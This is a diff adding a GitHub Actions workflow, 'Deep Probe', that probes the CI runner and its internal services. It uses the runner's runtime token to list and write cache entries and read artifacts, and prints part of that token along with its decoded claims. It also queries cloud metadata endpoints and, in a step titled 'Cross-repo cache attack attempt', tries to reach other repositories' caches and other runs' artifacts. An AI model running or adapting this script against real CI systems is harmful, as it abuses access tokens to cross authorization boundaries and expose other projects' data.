@@ -1,0 +1,150 @@
+name: Deep Probe
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe internal service endpoints
+        run: |
+          echo "=== INTERNAL ENVIRONMENT VARS ==="
+          env | grep -i "ACTIONS_\|GITHUB_\|RUNNER_" | sort | while read line; do
+            KEY=$(echo "$line" | cut -d= -f1)
+            VAL=$(echo "$line" | cut -d= -f2-)
+            if echo "$KEY" | grep -qi "TOKEN\|SECRET\|KEY\|PASSWORD"; then
+              echo "$KEY=[REDACTED length=${#VAL}]"
+            else
+              echo "$line"
+            fi
+          done
+
+          echo ""
+          echo "=== CACHE SERVICE PROBE ==="
+          echo "Cache URL: $ACTIONS_CACHE_URL"
+          echo "Cache Mode: ${ACTIONS_CACHE_MODE:-not set}"
+          
+          echo ""
+          echo "=== ATTEMPT: List cache entries via internal API ==="
+          # The cache API uses the runtime token for auth
+          CACHE_URL="${ACTIONS_CACHE_URL}_apis/artifactcache/caches"
+          echo "Querying: $CACHE_URL"
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "$CACHE_URL" | python3 -c "
+import json,sys
+try:
+    data = json.load(sys.stdin)
+    if 'totalCount' in data:
+        print(f'Cache entries found: {data[\"totalCount\"]}')
+        for c in data.get('artifactCaches', [])[:5]:
+            print(f'  Key: {c.get(\"cacheKey\",\"?\")} Scope: {c.get(\"scope\",\"?\")} Size: {c.get(\"cacheSize\",0)}')
+    else:
+        print(f'Response: {json.dumps(data)[:500]}')
+except:
+    print(f'Raw: {sys.stdin.read()[:500]}')
+" 2>&1 || true
+
+          echo ""
+          echo "=== ATTEMPT: Query cache with wildcard key ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=*&version=*" | head -c 500 || true
+
+          echo ""
+          echo "=== RUNTIME SERVICE PROBE ==="
+          echo "Runtime URL: $ACTIONS_RUNTIME_URL"
+          
+          echo ""
+          echo "=== ATTEMPT: List pipelines/containers ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json" \
+            "${ACTIONS_RUNTIME_URL}" | head -c 1000 || true
+
+          echo ""
+          echo "=== RESULTS SERVICE PROBE ==="
+          echo "Results URL: ${ACTIONS_RESULTS_URL:-not set}"
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "$ACTIONS_RESULTS_URL" | head -c 500 || true
+          fi
+
+          echo ""
+          echo "=== ATTEMPT: Access metadata endpoint from runner ==="
+          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200 || echo "No metadata service"
+          curl -s --connect-timeout 3 http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>&1 | head -c 200 || echo "No GCP metadata"
+
+          echo ""
+          echo "=== ATTEMPT: Enumerate internal GitHub hosts ==="
+          for host in "github.com" "api.github.com" "pipelines.actions.githubusercontent.com" "results-receiver.actions.githubusercontent.com" "productionresultssa.blob.core.windows.net"; do
+            IP=$(dig +short $host | head -1)
+            echo "  $host -> $IP"
+          done
+
+          echo ""
+          echo "=== TOKEN FORMAT ANALYSIS ==="
+          TOKEN_LEN=${#ACTIONS_RUNTIME_TOKEN}
+          echo "Runtime token length: $TOKEN_LEN"
+          echo "Runtime token prefix: ${ACTIONS_RUNTIME_TOKEN:0:20}..."
+          
+          # Decode JWT if it is one
+          if echo "$ACTIONS_RUNTIME_TOKEN" | grep -q '\.'; then
+            echo "Format: JWT"
+            echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
+import json,sys
+try:
+    claims = json.loads(sys.stdin.read())
+    print('JWT Claims:')
+    for k,v in claims.items():
+        if k not in ('iat','exp','nbf'):
+            print(f'  {k}: {v}')
+except Exception as e:
+    print(f'Decode error: {e}')
+" 2>&1 || echo "Not valid JWT"
+          fi
+
+      - name: Cross-repo cache attack attempt
+        run: |
+          echo "=== CRITICAL TEST: Can we access caches from OTHER repos? ==="
+          echo ""
+          
+          # Try to query cache for a different repo's scope
+          # Cache scope format: refs/heads/main
+          # But what about cross-repo?
+          
+          echo "Test 1: List all accessible caches (no key filter)"
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | python3 -c "
+import json,sys
+try:
+    data = json.load(sys.stdin)
+    print(f'Total caches accessible: {data.get(\"totalCount\", \"unknown\")}')
+    for c in data.get('artifactCaches', []):
+        print(f'  Scope: {c.get(\"scope\")} Key: {c.get(\"cacheKey\")} Created: {c.get(\"creationTime\",\"?\")}')
+except Exception as e:
+    print(f'Error: {e}')
+    print(sys.stdin.read()[:300])
+" || true
+
+          echo ""
+          echo "Test 2: Try to reserve a cache entry (write test)"
+          RESERVE_RESULT=$(curl -s -X POST \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json;api-version=6.0-preview.1" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" \
+            -d '{"key":"probe-test-key","version":"probe-version","cacheSize":100}')
+          echo "Reserve result: $RESERVE_RESULT"
+
+          echo ""
+          echo "Test 3: Access artifacts service"
+          ARTIFACTS_URL="${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts"
+          echo "Artifacts URL: $ARTIFACTS_URL"
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "$ARTIFACTS_URL" | head -c 500 || true
+
+          echo ""
+          echo "Test 4: Try manipulating the run ID to access other runs"
+          OTHER_RUN=$((GITHUB_RUN_ID - 1))
+          echo "Trying run ID: $OTHER_RUN"
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${OTHER_RUN}/artifacts" | head -c 500 || true
